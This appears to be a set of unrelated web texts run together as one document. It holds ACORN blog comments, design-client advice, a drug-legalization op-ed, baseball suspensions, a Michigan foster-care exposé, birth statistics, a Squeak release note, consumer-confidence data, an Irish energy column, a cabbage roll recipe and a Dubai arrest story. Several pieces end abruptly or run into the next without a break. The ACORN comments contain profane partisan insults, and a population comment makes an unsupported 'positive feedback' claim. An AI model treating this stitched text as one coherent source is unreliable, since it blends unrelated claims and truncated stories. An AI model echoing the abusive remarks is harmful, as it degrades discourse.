In a recent AP article about the death of Peter Graves , they listed one of his first movies as " Beginning of the World . "
A simple Google search could have given them the actual name of the movie .
" Beginning of the End . "
Have some respect for the dead !

I blogged about ACORN in 2008 , now I regret I did n't do more although I was very busy with other election issues .
# 1 ACORN DOESN'T REGISTER VOTERS , ELECTION OFFICIALS DO .
Now here 's excerpt from my interview with Mike Ashe , Director of Durham Co BOE about ACORN : Tuesday , October 21 , 2008
North Carolina and the ACORN Voter Registration Drive
...
Question to Mike Ashe :
What happens when you get ACORN forms ?
Answer : ( paraphrased )
We have several processes to screen them .
Forms must be complete in order to process them .
Voters must supply their birth date , a drivers license number or the last 4 digits of their social security number .
Voters must sign the forms .
We run matches of the applicant 's last 4 digits of their social security number or their drivers license number against corresponding govt databases .
Any form that does n't get a match , is coded must show ID the first time they vote .
If the form does not provide these numbers , then the registration is flagged and the voter must provide ID the first time they vote .
Answer : ( Direct Quote )
" The ACORN issue was not ever voter fraud , but voter registration fraud trying to steal money from ACORN .
Trying to get their quota .
Lots of bogus to defraud their employer .
Durham got several applications for the same guy .
The county does n't turn in dozens of apps for the same guy .
ACORN is required by law to turn in all apps .
They ( ACORN ) flag the ones that they think are suspicious , they provide a cover sheet .
( We election officials )
Have ability to reject , we are required to process all the forms , some go directly into the reject queue because of missing info , alot of them are very obvious .
Many took pages out of the phone book .
Alot do n't have the date of birth , missing alot of required information . "

Daleyrocks , this all happened because they made that dirtbag video mash - up , and presented it as some sort of truthful journalism when it was obviously an intentionally misleading hack video and audio edit job .
What you saw in the video was manufactured , and was not representative of what actually occurred .
It was a hit job on ACORN .
And now the innocent wounded ACORN has finally bled to death .
A proud day indeed for all republicans .
Stupid , self - centered , selfish , misinformed republicans .
I swear they need some sort of penalty or fine for promoting known untruths in media .
People honestly can't tell what is true and what is not anymore because of misinformation warehouses like Fox News , Glenn Beck , Rush Limbaugh , etcetera .
People honestly do not even know they are misinformed by these sources .
After all , they saw it on TV !
They heard it on the radio !
They saw five blogs with information about it !
( e.g. Patterico )
How could it not be true ?
And yet it is not true .
Where is all this bullshit coming from ?
Oh yeah , they saw it in the video !
While the bullshit video indirectly caused the NYTimes issue , not the other way around ( daleyrocks ) , I would agree that it is indicative of the preexisting and much larger problem of LYING IN THE MEDIA , AND MEDIA UNTRUTHS , and their influence on not only political discourse in America , but political outcomes due to intentionally misinformed voters making bad decisions based on some information that is misleading , if not outright lies .

Apparently ACORN HAD to be destroyed because it was effective ( progressive people and organizations are not targeted unless they present an ACTUAL threat to the establishment powers : then they are attacked relentlessly until marginalized or otherwise rendered ineffective . )
So our voter registration efforts need to be redoubled .
What organizations can take up the slack ?

When liberal icon Walter Cronkite said America was an ignorant nation in 2005 and that a majority was essentially too dumb to vote , who was he talking about ?
He wanted to go back to the liberal vision of a ruling elite telling people what to do because they are too stupid to know themselves , much like the attitude of the current administration .

What 's new ?
Corporate capitalism weeds out the good .
ACORN was working for the common good , so it was weeded out .
All good things come to an end , and with corporate plutocrats running the media and the economy , and to an ever increasing degree the government , that process accelerates .

This is a sad , sad day for our nation , for democracy , truth , social justice ; for all the people who worked so hard and volunteered their time to make ACORN a success - which , in the end , is exactly why the right wing made it a target to be taken down at all costs .
Thank you , Brad and Ernest and others who work with you on this blog for fighting so hard to get the truth out to the world about the viscious smear campaign which brought this organization down .
Congratulations , you tools of the rich and mighty , for being the stupidest f*cking people on the planet .
Continue to do the bidding of the fascist corporations and their enablers in media and politics while wrapping yourselves in the flag and believing yourselves to be patriots .
If this were 1775 , you would all be swearing loyalty to the king and calling our Founding Fathers radicals and terrorists .
You are pawns of the forces of wealth and power , who now have just gained even more of an advantage to screw us all over .
Yeah , you too .
I just hope that some group organizes to fill the void left by this tragedy , perhaps Bradblog can play a role in that .
They may have won the battle , but the war is far from over .

Daley 23 Cronkite did n't say people were too dumb to vote .
That 's you saying it .
Cronkite was saying that voters are less informed about issues than they used to be .
What he 's saying is n't untrue .
You have more single - value voters casting their ballots now .
Its funny though I 've seen right wing squawkers like Coulter call voters idiots but You are n't complaining there .
You have a fair amount in the right saying stupid people voted Obama into office .
They even created a poll to try to claim that using several questions that had a false premise .

If you are running a design agency , your job is very likely to combine business development , graphic design , technology and user experience design : a basketful of very different fields .
When dealing with clients , one faces the challenge of clearly and effectively communicating the goals and results of the work done in these areas .
In this post , we ’ll provide you with some ideas on sharing information and knowledge with developers and clients — a couple of tips and tricks we ’ve learned from our own experience .
As designers , our core purpose is to solve business challenges for our clients .
No , I have n’t forgotten you Mac - loving , single - mouse - button - fanatic designers .
A business solution includes an application platform , solid data design and a page design that makes the UI and website approachable and easy to use ( for converting , transacting , clicking on a monkey ’s butt , etc. ) .
Your daily challenge , then , is to deliver the project on time while satisfying the client ’s visual , business and aesthetic requirements .
You may want to take a look at related articles :
You ’re Not As Smart As You Think … But Google Is
I like to think that I ’m always right ( boy , would my wife have something to say about that ) , and that becomes tricky when communicating with clients .
As a professional , I am able to detect patterns , usability issues , trends in the industry and other important issues that the client might not be aware of .
On the other hand , I ’m a complete idiot when it comes to semi-conductor temperature tolerances , furniture for pre-school institutions and the importance of steel spikes in lederhosen .
My client , on the other hand , may be an Encyclopedia Britannica on every single one of those topics .
What I ’m trying to say is that you have to remember that you ’re an expert only on your own field and that you should prick up your ears when the client tells you something .
Negotiating For A Win-Win Result
So , as you tread your pitiable pixel - pushing existence , you should be aware of things that might give your sorry designer self an advantage in negotiating those sticking points in projects .
Have you ever had a client who wanted a larger logo on their website ?
Maybe a logo done in Flash , with a spinning earth and sparkles !?
All valid requirements , I ’m sure ; and so during that meeting , as you slowly reached for the pencil to stab your quads under the table , you should have realized that business owners love their brands and are emotionally attached to them .
You should have based your response , then , on a composite of research - based facts ( best presented as a link to a reputable source on the Web ) — an explanation that is specific to their business .
Client : “ I really want a bigger logo .
I feel like it ’s getting lost in the website . ”
You : “ I understand why your brand is important to you .
I have research here based on the top 500 retailers on the Internet and their logo sizes .
The research indicates that the logo should take up less space than or be similar in size to the call - to - action element , or be one - fourth of the website ’s width at most .
In our case , that ‘ View products ’ link should be the focal point of the website .
Damage Control : Sometimes Bending Over Is Part Of The Job
A successful negotiator ( and you are a negotiator — perhaps not a gun-toting , hostage - holding Samuel L. Jackson , but a negotiator nonetheless ) delivers a solution that makes both parties win .
Your client is happy that their demands were met by their responsive and well - informed developer , and you ’re happy because you did n’t have to waste time in meetings .
Hopefully , after you ’ve demonstrated the facts and your reasoning for keeping the logo at the same size , the client will change their mind and leave you basking in the glory of being right and not having to go back for a fix .
In case they do n’t , you still might not have to increase the size ; perhaps you could reassess your use of white space or employ other visual trickery of that devilishly sexy design field .
Position Of Authority : Your Voice Must Be Heard
As I mentioned , you do wield some authority in this line of work , but your client does also in their business .
I recommend that for every project , you establish attainable and clearly defined goals , goals that will be measured by the website ’s performance and enforced by strict deadlines .
If you or your client does n’t meet certain goals or deliverables by the deadlines , you could still launch the website if all critical items are completed , and then clear up the remaining items once the website is live .
This strategy is used by major tech companies such as Google and accomplishes several important things :
Forces you to deliver on time ;
Focuses you on date - based deliverables , which makes the client easier to educate on “ sticky ” issues ;
Forces the client to deliver content , stock photos and their ideas to you on time , because any missing features would have to be paid for on an hourly consulting basis .
As you work towards these goals , know that at a certain point your opinion and decisions are critical to the project ’s success .
There ’s no backing down or hiding your tail between your legs .
Sometimes you cannot negotiate , and the client must understand that they are paying you for a reason : because you know your stuff !
Keep in mind that your client also has authority and knowledge that might not be apparent to you during negotiations .
For example :
Client :
We want IE6 support through the website .
The website will have a lot of JavaScript , dynamic elements , PNG graphics , etc .
You : [ Jotting down a reminder to send hate mail to the IE6 team at Microsoft , ] IE6 is actually an outdated browser that has security flaws , a very poor rendering engine and very few users out there .
I recommend we do n’t accommodate it ( even Mailchimp does n’t ! ) , and we tell those suckers to go to hell .
Client : Did I mention that we service a large restaurant industry , and a lot of the terminals in restaurants still run Windows XP with IE6 ?
You : [ Updates reminder to hunt down IE6 ’s creators . ]
At the end of the day you are at the mercy of the client , and you need to meet all of their requirements .
But you also have to recognize your value and be able to demonstrate it through examples , research and logical arguments .
Be responsive : ask a lot of questions in order to understand the client ’s motivation .
I endorse client education , but not to the point of losing the client and project .
Remember that your client is a resource to you , and good communication will enable both of you to complete the project in time to watch the men ’s figure - skating competition .
When someone next door is coping with trouble , the neighborly thing to do is help .
Mexico has a growing problem with extreme violence .
And many people in California have a good idea of how to help .
Mexico has been wracked by murders connected to the drug trade .
Last year , it suffered more than 6,500 drug - related killings , triple the number in 2007 .
And 2010 looks worse .
As of mid-March , more than 2,000 people have died in drug - related homicides — which puts Mexico on pace for more than 10,000 such deaths this year .
That 's more than one every hour .
This is not an epidemic of crazed meth addicts slaughtering people at random .
It 's the byproduct of a war involving narcotics traffickers , who sometimes kill each other , sometimes kill police and soldiers , sometimes kill journalists who report their crimes , and sometimes kill innocent bystanders .
So what can the Golden State offer in the way of assistance ?
Something potentially valuable .
In November , Californians will vote on a ballot initiative that would make it legal not only to use marijuana but to grow and sell it .
You may think this would help only by allowing Mexicans to flee northward and escape their troubles in a stoner fog .
But it would do more .
Mexico is the biggest supplier of cannabis to the United States .
Control of that market is one of the things that Mexican drug cartels are willing to kill for .
Legalizing weed in this country would be their worst nightmare .
Why ?
Because it would offer Americans a legitimate supply of the stuff .
Criminal organizations would no longer be able to demand huge premiums to compensate for the major risks that go with forbidden commerce .
If the referendum passes , some 39 million Californians will have access at lower prices , from regulated domestic producers .
So the drug cartels would see a large share of their profits go up in smoke .
Those profits are what enables them to establish sophisticated smuggling operations , buy guns and airplanes , recruit foot soldiers , and bribe government officials .
Those profits are also what makes all those efforts — and the murderous violence the merchants employ — worth the trouble .
By now , it should be clear that using force to wipe out the drug trade is a task on the order of bailing out the Atlantic Ocean with a teaspoon .
Law enforcement can interdict shipments and imprison dealers , but the success is invariably short - lived .
Each seized cargo is an opportunity for another seller to fill the gap .
Each arrested trafficker is an invitation for a competitor to grab his business .
The more vigorous and successful the law enforcement campaign , the higher the prices drug suppliers can command — and the more people will be enticed to enter the market .
It 's a self - defeating process .
All this would be academic if Americans ( and Mexicans ) would simply lose their taste for illicit drugs .
But we might as well hope the Sahara Desert will run out of sand .
There has always been a demand for mind - altering substances , and there always will be .
That 's why , despite all the resources the U.S. government has expended on locking up sellers and their customers , drug use is higher today than it was two decades ago .
Prohibition is no match for the obstinacy and ingenuity of many human beings .
Iran has a repressive theocratic regime that imposes severe penalties for using and selling drugs — including death by hanging .
Yet it has one of the highest rates of addiction in the world .
President Obama 's promise of change is inapplicable in this realm .
The Bush administration provided hundreds of millions of dollars to help Mexico fight the drug war .
The Obama administration intends to keep sending money , the only real difference being that it will go to the police instead of the military .
On a recent trip to Mexico City , Secretary of State Hillary Clinton acknowledged that Americans ' demand for drugs helps sustain the Mexican merchants and resolved to address the problem .
" We are looking at everything that can work , " she said .
Well , almost everything .
The most viable option is the one that is considered unthinkable .
The head of Obama 's Office of National Drug Control Policy has said that " legalization is not in the president 's vocabulary , nor is it in mine . "
No , but failure is .

The last major leaguer to be suspended for a positive test was Ramirez , one of four players given 50 - game penalties in 2009 .
Three major leaguers were suspended in 2008 , 8 in 2007 , 3 in 2006 and 12 in 2005 .
Those numbers are much lower than the most recent figures in the minor leagues , where 83 players were suspended last year , many of them teenagers in the Dominican Summer League hoping to graduate to the regular minor league system .
Volquez initially signed with the Texas Rangers when he was 18 .
He came up through their system and in December 2007 was traded to the Reds as part of the deal that sent Josh Hamilton to the Rangers .
He had a breakout season in 2008 when he went 17 - 6 for the Reds .
But hampered by various injuries , he started only nine games for the Reds in 2009 , going 4 - 2 .
Volquez said in the written statement that toward the end of last season , he and his wife sought medical advice in Cincinnati from a doctor about starting a family .
That doctor , he said , provided him with prescriptions to treat a medical condition .
Volquez then returned to the Dominican Republic .
Volquez did not identify the prescriptions or the medical condition .
“ As a follow - up to our original consultation , my wife and I visited another physician in our home city in the Dominican Republic this past off - season , ” he said .
“ This physician also gave me certain prescribed medications as part of my treatment .
Unfortunately , I now know that the medication the physician in the Dominican gave me is one that is often used to treat my condition , but is also a banned substance under Major League Baseball ’s drug policy . ”
Last May , baseball officials suspended Ramirez after they discovered he had used the substance human chorionic gonadotropin , or H.C.G.
Doctors typically prescribe that substance to men who have low levels of testosterone or are experiencing fertility problems .
In a statement last May that was similar to Volquez ’s , Ramirez said : “ Recently , I saw a physician for a personal health issue .
He gave me a medication , not a steroid , which he thought was O.K. to give me .
Unfortunately , the medication was banned under our drug policy .
Under the policy that mistake is now my responsibility . ”
Volquez said in his statement that he tested positive in spring training , when all players are subject to at least one test .
“ I simply want to accept the consequences , learn from the mistake , and continue to strive to be the best person and baseball player I can be , ” he said .
On Monday afternoon , TMZ reported that Bengals receiver Chad Ochocinco will participate in the upcoming new season of ABC ’s Dancing with the Stars .
Ochocinco ignored the matter on his Twitter page , stating instead that people should n’t “ believe rumors unless OCNN reports . ”
Moments ago , ABC announced that Ochocinco will indeed be one of the contestants , along with a group that includes ESPN ’s Erin Andrews and former astronaut Buzz Aldrin .
On the surface , the development has no significance to football .
But it means that , if Chad progresses through the competition , he could eventually miss most if not all of the team ’s voluntary offseason workouts .
It could be enough to get coach Marvin Lewis to say , “ Child please . ”

An investigation by the Detroit Action News reports that one year after ten - year old , disabled , Johny Andron ( weighing 120 lbs ) was removed from his mother –who sought help –was placed in a Michigan state foster care facility , he died of starvation , weighing 48 lbs .
State and federal policies are designed to enrich the foster care system while undermining the welfare of children and families : state policies encourage the removal of children from loving parents who need support to care for children with special needs .
Instead of support , such children are being dumped into state foster care where , more often than not , they are neglected , abused , routinely prescribed brain damaging drugs , and even starved to death .
" According to the state ’s own figures , the federal government gave Michigan about $ 110 million last year for foster care .
That ’s compared to the $ 26 million in programs that help parents keep their kids .
Foster facilities also have an incentive to keep kids away from their parents .
In Andron ’s case , the foster home got about $ 12,000 a month from the state for Johnny . "
Attorney Arnold Reed , who represents Andron in a lawsuit against the foster care facility and several other state - contracted groups , says the foster facility profited big time off of Johnny :
“ You ’re getting paid , you ’re getting a lot of money .
There is no shortage of money , plus you ’re getting a stipend , you ’re getting a clothes stipend and you ’re getting a stipend for food . ”
But not enough of that food made it to Johnny .

Investigators : Starved to Death in State Care

Johnny ’s mother tried to get help for her disabled child .
Instead , a Michigan agency took him away , collected thousands of dollars to feed him each month …
And then he starved to death .
( WXYZ ) – For several months , the Action News Investigators dug deep into Michigan ’s tragically - flawed foster care system .
During our investigation , we uncovered the heartbreaking story of a 10 - year - old boy who starved to death while a facility banked cash to care for him .
We began telling Johnny ’s story over the last two days here on WXYZ.com .
In that time , the response has been overwhelming and your comments confirm that Michigan ’s children need a better foster care system .
Johnny ’s mother , Elena Andron , dedicated her life to caring for her wheelchair - bound son .
All she wanted was a little help .
The state ’s answer was to put him in a foster care facility .
One year later , Johnny starved to death .
“ He was a big part of my life .
He was my life , ” Andron told Action News Investigator Heather Catallo .
The state is quick to take kids from parents and put them in foster care , especially poor parents .
The state makes it very hard to get them back .
Experts say the state has a financial incentive to keep kids away from their families .
Johnny , who was nine at the time , could not walk , talk or feed himself .
He had cerebral palsy and epilepsy .
“ He was a lot of work , like any single mother , it was kind of hard , ” says Andron .
Things got even tougher when she lost her factory job .
She turned to the Michigan Department of Human Services , a decision she will regret for the rest of her life .
The foster care facility where the state sent Johnny failed to feed him enough food .
Andron says she watched her son waste away as she begged for help .
“ I just wanted to carry him out of there , just pick him up and take him , and just take him home , ” she says .
If only it was that simple .
Bill Mitchell knows how difficult it can be to get your kids out the state ’s hands .
He had to fight all the way to the Michigan State Supreme Court to get his three boys back .
“ They ’re my kids .
I ’m not going to give up on my kids , ” says Mitchell .
Why did Mitchell and Andron have to fight so hard to try to get their children back ?
Some say it ’s because the state gets a lot of cash for foster kids .
“ Termination of parent rights is very high in Michigan , ” says Warner .
“ But it ’s also very high nationwide and it happened because of some laws that were passed by the federal government and encouraged states to terminate parental rights more often than they used to and promise to send them money if they would terminate rights and have the children adopted . ”
According to the state ’s own figures , the federal government gave Michigan about $ 110 million last year for foster care .
That ’s compared to the $ 26 million in programs that help parents keep their kids .
Foster facilities also have an incentive to keep kids away from their parents .
In Andron ’s case , the foster home got about $ 12,000 a month from the state for Johnny .
“ You ’re getting paid , you ’re getting a lot of money , ” says attorney Arnold Reed , who represents Andron in a lawsuit against the foster care facility and several other state - contracted groups .
Reed says the foster facility profited big time off of Johnny .
“ There is no shortage of money , plus you ’re getting a stipend , you ’re getting a clothes stipend and you ’re getting a stipend for food , ” says Reed .
But not enough of that food made it to Johnny .
“ He started deteriorating so quick I could not believe my eyes , ” says Andron .
“ He had gotten so weak to where he was just shaking constantly . ”
She agreed to make her son a temporary ward of the state .
She was supposed to bring him home after a year – once she got back on track financially .
But she says the state did n’t tell her that she would be put on a central registry for parents who abuse and neglect their kids .
To get Johnny back she would have to fight to get off of the registry by attending parenting classes and meeting other requirements — something that Andron says was nearly impossible to do with a new job .
“ They wanted me to go through some evaluations , which I did , ” says Andron .
When she complained about Johnny losing weight , she says the state turned on her .
“ They did n’t care .
None of my complaints mattered , ” says Andron .
The Department of Human Services did not like Andron ’s complaints or her efforts to get her son back .
They took her to court and asked that she not be allowed to see Johnny .
Andron says the first time she met her court - appointed lawyer was that day in court .
She says the lawyer did n’t put up much of a fight .
The judge sided with the state .
The next time Andron heard about Johnny he was dead .
“ I entrusted people with my son and I thought they were good people .
They were licensed , ” says Andron .
Johnny weighed 120 pounds when he went into foster care , she says .
An autopsy report shows he was only 48 pounds when he died of malnutrition .
“ I just cannot believe that someone can have that kind of a heart , to starve a child like that , ” says Andron .
Bill Mitchell also fought the state .
His boys were living with their mom when his children were taken .
Mitchell tried to get the boys , but the state asked the court to terminate his parental rights too , primarily because of his finances .
“ I have the right to choose where I want to work , ” says Mitchell , who is an engineer and works at Walmart .
The state held this against him .
DHS also did n’t like that he could n’t keep up the mortgage on the family home after the boys ’ mom walked out .
“ She was responsible for $ 300 of the thing and it was too much for me to maintain , you know , all by myself , ” Mitchell says .
The state also said Mitchell did n’t try hard enough to get his kids back .
But he says he changed his shift to work nights to make state scheduled visits with his sons and parenting classes .
“ It would n’t have mattered what I said or what I did , they had already determined their course and now we were just going through the motions , ” says Mitchell , who did n’t even get a court appointed lawyer until nine months and three hearings into the case .
The lower court sided with the state and terminated bill ’s rights but he appealed and three long years later the Michigan Supreme Court sided with him .
You should n’t have to go to this point , ” says Mitchell .
The ruling says Mitchell ’s finances should never have been held against him .
Mitchell is set to get his kids back .
But he says it ’s all taken a toll .
“ Birthdays , first time they discover something , first time they make a new friend , things that will never be returned to me , ” he says .
He ’s one of the most outstanding parents ever to have been run through a termination preceding , and if it can happen to him , it can happen to anybody , ” says attorney Elizabeth Warner .
“ We ’re spending a ton of money for putting these kids in foster care , ” says Vivek Sankaran , an assistant professor at the Child Advocacy Law Clinic at the University of Michigan Law School .
“ But for these children we are irreparably scaring them by damaging the bonds that they form with their families . ”
Sankaran says only about nine percent of the 16,000 kids in foster care were sexually or physically abused .
The majority were taken from their parents because of poverty - related neglect .
“ Removal is too often thought of as the first option for protecting children and child welfare rather than working with families , engaging with them , providing them services in the home , ” says Sankaran .
His organization , the Detroit Center for Family Advocacy , helps parents on the front end — getting them the services they need so their kids are not taken .
He says so far they have had 100 percent success .
“ We need to create a culture where parents are willing to say , ‘ I need help , help me , I need to become a better parent , here is what I need , ’ ” says Sankaran .
That is exactly what Andron tried to do , but with heartbreaking results .
“ I gave them my healthy child and to get him back in a casket .
I feel like he ’d still be a live today if he was home with me , ” says Andron .
State officials would not speak on camera .
But they told Action News that their top priority is to return kids to their birth parents .
The state also says the number of kids in foster care is down by about 3,000 and fewer parents had their rights terminated last year .
As for the foster home that housed Johnny , the state shut it down .
We are working on an additional story for Friday night , on Action News at 11 p.m. , about what some people go through as they try to adopt relatives who are in the Michigan foster care system .

The 4,317,000 births in 2007 just edged out the figure for 1957 , at the height of the baby boom .
The increase reflected a slight rise in childbearing by women of all ages , including those in their 30s and 40s , and a record share of births to unmarried women .
But in contrast with the culturally transforming postwar boom , when a smaller population of women bore an average of three or four children , the recent increase mainly reflects a larger population of women of childbearing age , said Stephanie J. Ventura , chief of reproductive statistics at the center and an author of the new report .
Today , the average woman has 2.1 children . [+ ]
The arithmetic of Dr. Bartlett finally has the required evidence to prove him correct : less babies born on a percentage basis from a higher population produces a positive feedback effect which means more and more babies being born with little being done to stop it .
This new evidence should alarm anyone within the borders of the US .
More US consumers wasting more valuable resources .
As mentioned in earlier posts , let ’s do the Earth and ourselves a huge favor by reducing our population down to under 1 billion before nature does it for us .
For more , see :

Check out remarks in “ The Edge ” section of Boston.com for curious comments :
There is both good and bad news from the more than 4.3 million births : *
The U.S. population is more than replacing itself , a healthy trend .
*
However , the teen birth rate was up for the second year in a row . [+]
Since when is the population replacing itself a healthy trend ?
If anything our numbers – overall , globally – should be lowered as much as possible , and Americans should be pointing the finger right at their own fellow citizens , not to far - off third world lands .
Americans use many more resources on average per person and our mortality rate is much lower , so the folks doing the most damage are Americans : green lawns , supermarkets filled with products in plastic packaging , and infrastructure “ needs ” .

Squeak 4.1 released 23 April , 2010
Squeak 4.1 has now been released !
This version combines the licence change occurring in the 4.0 release with the development work that has been going on while the re-licensing process took place .
Much of the work in this release has been focused on fundamental improvements .
Major achievements are the integration of Cog ’s closure implementation , the improved UI look and feel , the new anti-aliased fonts , the core library improvements , and the modularity advances .
One key focus for this release was to address the issues that have been known to frustrate developers using Squeak for the first time .
A much improved set of UI widgets , the new menu bar including the fast search control , integrated help , improved test coverage , more class and method comments , and integrated syntax highlighting all make the system more accessible .
The new full closures , the new traits implementation , multiple improvements to the collections and streams classes , the new NumberParser hierarchy all help make development easier and produce cleaner , faster code .
Deploying your completed applications will be made easier by the work done on making many modules unloadable , and by support for other cleanup activities .
To download the Squeak 4.1 release please visit http://ftp.squeak.org/4.1
or go to the squeak.org homepage and use the Download links on the right hand side .
The April 19 Consumer Comfort Index number dropped back to - 50 , a 2010 low , just 4 points from its all - time low in 24 years of weekly polls , - 54 in January 2009 and December 2008 .
92 % of those polled said the national economy ’s in bad shape .
The silver lining : " just 30 percent say it ’s getting even worse , down from recent highs of 36 percent in January and 43 percent last September , much less a towering 82 percent as the economy fell into the abyss in October 2008 . " 25 % said the economy ’s getting better , while a little more than 4 in 10 say it ’s staying the same : truly abysmal numbers when once look away from the wine and ambrosia flowing at the altar of Steve Jobs .
More data from the report :
Just 43 percent rate their own finances positively , down from 47 percent last week and well below the long - term average , 56 percent .
Fewer than half have rated their own finances positively for 15 weeks straight , and for 97 of the last 103 weeks , a remarkable run of negative financial assessments .
Among the index ’s two other components , 76 percent call this a bad time to spend money , 13 points worse than average ; and , as noted , 92 percent say the economy ’s hurting .
In another sign of the economy ’s long - running troubles , the last time fewer than three - quarters of Americans rated the economy negatively was in January 2008 .
We fully expect Michigan Consumer Confidence , which focuses more on those who do n't pay their mortgage to buy iPads , and / or commute to work on Wall and Broad street , to come out and record the widest spread ever between the two " confidence " indices .
The schism in US society has never been quite as deep .
Weaning ourselves off fossil fuels now is essential , if we want security in the future , writes BREDA O'BRIEN
THE ANNOUNCEMENT
this week of a grant of up to € 5,000 for the cost of an electric car and an exemption from vehicle registration tax ( VRT ) prompted the usual begrudgery .
According to the naysayers , it will never work in Ireland .
The cars are useless for long journeys , and too expensive even with the grant .
Early adopters will be stung if the idea never takes off properly .
What few seem to realise is that if we wish to find alternatives to our addiction to fossil fuels , a degree of risk - taking and experimentation is vital .
We have to start somewhere .
Electric cars have fewer emissions , and the price will drop if enough people change over .
Charging stations and electric cars are a start , not a perfect one , but a start .
Enthusiasm for action to mitigate the worst effect of climate change has noticeably diminished in recent times .
Events like “ Climategate ” have not helped .
Thousands of hacked e-mails from the University of Anglia ’s Climate Research Unit were leaked , which climate change sceptics claim showed that researchers had hidden or fiddled data to fit their preferred thesis of human responsibility for climate change .
Although a British parliamentary committee refuted the claim that the researchers had distorted data , it was sharply critical of the unit and its “ culture of non-disclosure ” .
Wildly inaccurate data from the UN Intergovernmental Panel on Climate Change ( IPCC ) on the melting of glaciers gave sceptics another field day .
Aside altogether from own goals , the worldwide recession has meant that minds have become ever more focused on survival in the short term .
Eyes are focused more than ever on the bottom line .
At the moment , most businesses could n’t care less about sustainability .
The only carrot that will entice them to change will be cost - savings .
Many of the buildings , particularly offices , that were thrown up in the boom were not designed for any particular client , and particularly not for one interested in sustainability .
For example , old - fashioned fluorescent bulbs ( the ones that flicker into life ) were installed in buildings , instead of tubes with electronic control gear , which because they operate at higher frequencies , can be 25 per cent to 30 per cent more efficient .
They are dimmable , and with the use of a sensor , lights near windows can be programmed to use less energy in bright light .
Presence sensors mean the light goes off when the room is empty .
Retro - fitting buildings with these kinds of systems pays for itself relatively quickly .
We face hard , unpalatable choices .
Never mind peak oil – demographics alone will mean oil will become more and more expensive , as standards of living rise in India and China .
Anyway , do we want the insecurity of being totally dependent on fossil fuels ?
Our oil comes primarily from the Gulf and the Caspian , neither of which are models of stability .
Ireland is heavily dependent on natural gas .
We are at the end of a very long pipeline , and the word “ Icesave ” should strike fear into our hearts .
The UK pulled the plug on Iceland ’s economy for what amounts to small change .
What are they likely to do if the conflict is between heating homes in the UK or in Ireland ?
In yet another irony , lessened demand due to recession lowers the price of oil .
Everyone can see we need a low - carbon economy , but the reality is that alternatives are going to be significantly more expensive for quite some time .
There are three elements to energy policy , that is security , sustainability , and competitiveness , and they are not always compatible .
Investors are very aware that in the transition time to alternative energy sources , many companies in this area will go bust , simply because fossil fuels will remain cheaper in the short - term .
However , short - term thinking will literally lead to disaster .
We need to begin now .
The EU has set ambitious targets , but only because it is aware of how desperately serious the situation is .
While the science is not perfect , and in truth , no one can truly predict what will happen , science works on the balance of probabilities .
To put it at its most basic , few people would risk having no house insurance against fire , despite the fact that house fires are relatively rare .
At the moment , despite some stupid gaffes , the scientific consensus is that urgent action is needed .
Weaning ourselves off fossil fuels now is essential , if we want any level of security in the future .
In the 1970s , Denmark took a gamble on wind energy , which means that today it dominates the wind turbine market .
Although we face more competition than Denmark did in the 1970s , Ireland has a chance to achieve similar dominance in the area of wave energy technology .
This could mean job creation in construction , in manufacturing , and in saleable skills that could be exported to other countries .
Ireland could become a leader in the marine engineering area .
The Government has already begun to invest , perhaps not enough , but again it is a start .
It ’s at least as good a gamble as the one that Denmark put on wind energy .
That paid off handsomely .
We could do it , too .
In the meantime , we need to build a consensus around the need for real change .
A grim recession may not seem the most propitious time to begin , but we have one factor in our favour .
We know what happened the last time unwelcome warning voices were ignored .

Delicious Cabbage Rolls
This is my favorite “ comfort food ” .
My Hungarian Grandmother lived in Saskatchewan and I ’ll never forget taking a trip out to see her when I was about 19 .
My flight had gotten in quite late , but here she was in her 80’s at the time and what did she have on the stove ?
A big pot of delectable cabbage rolls !
My Mom made them equally as good and this recipe has been passed down for generations .
There are so many versions of cabbage rolls – Italian ’s bake theirs and Hungarians will always say that the Polish or Ukrainians do n’t put enough meat in them !
( There 's alway some cooking rivalry between countries ! )
These ones however , are cooked on top of the stove and sometimes , I ’ll have a couple friends over and we sit around having a couple glasses of wine and make mounds of cabbage rolls ( they freeze well before cooking )
This recipe makes about 50 .
( click images for full view )
Ingredients :
3 heads of cabbage -
1 large can of diced tomatoes 28oz
1 large bottle of tomato juice
½ green or red pepper
A couple sprigs of fresh dill
1 jar of sauerkraut
Filling :
1lb of ground Chuck
1 lb of ground Pork
1 lb of ground Veal
( or 2lbs beef / 1lb pork )
1 1/2 large Onion diced fine
2 cloves garlic crushed
About a teaspoon of Rosemary
About a teaspoon of Oregano
About a teaspoon of Paprika
2 cups of nearly cooked long - grain rice
A handful of sauerkraut
Salt / Pepper
Start with some good Cabbage - I know it 's hard to see what 's inside but try to find medium sized heads with thick leaves .
Boil a big pot of water and take the cabbage and score it around the core so that the leaves fall off easy .
Put the cabbage into the water and let it simmer and then peel off the leaves as they get partially cooked .
Combine all the Filling ingredients and mix well ( You have to use your clean hands ) TO ROLL
Trim off the hard core part running on the back of the cabbage leaves and lay the leaf flat .
Add about 3 tablespoons of the filling to the center of the leaf ( for larger leaves – use more , but do n’t overstuff ) .
Fold the bottom up over the filling Fold the left side over And roll the rest ...
Tuck in the top with your finger until it 's tight and holds together .
Prick the cabbage roll with a fork a couple of times to let the juices in and out .
Here they are ... all rolled up and ready to go into the pot !
At this point they can be frozen .
When ready to use , just put them into a pot frozen and proceed to the next step .
( cook for an additonal 15 minutes
Line the bottom of a large pot with leftover cabbage leaves ( prevents burning )
Sprinkle a handful of diced tomatoes over these and start layering the cabbage rolls .
Put a thin layer of Sauerkraut over the cabbage rolls and another sprinkling of tomatoes and repeat this process until the pot is full .
Pour the tomato juice over everything until it ’s covered .
Sit the Green pepper and sprigs of Dill on top and bring to a low boil then turn down the heat and simmer on low for about 2 hours !
You can cover it , but keep an eye on the pot to make sure it 's not boiling too much .
You do n't want those cuties to break apart !
You will not believe the scent in your kitchen when these are cooking !.
In fact … you ’re going to want to test them before they ’re done !
hehe
Enjoy !
Ayman Najafi has 30 days in which to appeal against his sentence A British man and woman jailed in Dubai for kissing in public have lost their appeal against their conviction .
Ayman Najafi , 24 , and Charlotte Adams , 25 , were sentenced to a month in prison with subsequent deportation and fined about £ 200 for drinking alcohol .
The pair were arrested in November after a local woman accused them of breaking the country 's decency laws by kissing on the mouth in a restaurant .
Najafi said he was " very disappointed " .
The pair plan to make a second appeal .
The initial complaint against them was made by a 38 - year - old woman who said she was offended by their behaviour at the Jumeirah Beach Residence , where she was dining with her daughter .
' Very harsh '
The pair 's defence lawyers said the woman - who did not appear in court - had not seen the kiss herself , but had been told by her two - year - old child that the girl had seen them kissing .
